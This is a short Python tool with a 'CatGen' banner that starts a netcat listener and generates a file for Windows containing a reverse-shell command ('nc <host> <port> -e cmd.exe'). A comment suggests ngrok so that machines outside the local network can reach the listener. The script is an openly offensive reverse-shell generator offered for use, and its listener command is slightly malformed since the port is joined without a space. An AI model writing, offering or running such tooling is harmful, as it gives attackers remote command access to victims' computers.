import time
import subprocess
from subprocess import Popen,PIPE
import colorama
from colorama import Fore, Style

def printBanner():

        print(Fore.RED + """\n ▄████▄   ▄▄▄     ▄▄▄█████▓  ▄████ ▓█████  ███▄    █ 
▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒ ██▒ ▀█▒▓█   ▀  ██ ▀█   █ 
▒▓█    ▄ ▒██  ▀█▄ ▒ ▓██░ ▒░▒██░▄▄▄░▒███   ▓██  ▀█ ██▒
▒▓▓▄ ▄██▒░██▄▄▄▄██░ ▓██▓ ░ ░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒
▒ ▓███▀ ░ ▓█   ▓██▒ ▒██▒ ░ ░▒▓███▀▒░▒████▒▒██░   ▓██░
░ ░▒ ▒  ░ ▒▒   ▓▒█░ ▒ ░░    ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ 
  ░  ▒     ▒   ▒▒ ░   ░      ░   ░  ░ ░  ░░ ░░   ░ ▒░
░          ░   ▒    ░      ░ ░   ░    ░      ░   ░ ░ 
░ ░            ░  ░              ░    ░  ░         ░ 
░                                                    \n\n""")
        print(Style.RESET_ALL)
        return (printBanner)
printBanner()

ncport = 3002 #if you change this port make sure it's free
nchost = '127.0.0.1' #can be a local ip or external ip, I recommend using ngrok
bandaid = '-e cmd.exe'

time.sleep(1)

print("Select an option... \n\n")

time.sleep(1)

def main():
    while True:
        beginning = input(
            "1. Start a netcat listener (1) \n2. Generate a netcat file for Windows (2): \n\n"
            )
        if beginning == '1':
            try: 
                print("Starting listener and waiting for a connection...\n")
                cmd = subprocess.check_output(
                   'nc -lnvp' + str(ncport), shell=True
                    ).splitlines()
                return cmd
            except subprocess.CalledProcessError:
                print("Disconnected!")
                exit()
        elif beginning == '2':
            nameoffile = input(
                "What do you want the name of your file to be? "
                ) 
            with open(nameoffile, 'w') as f:
                f.write(f"nc {nchost} {ncport} {bandaid}")
            print(f"{nameoffile} created.")
            return nameoffile
            break
        else:
            break
main()
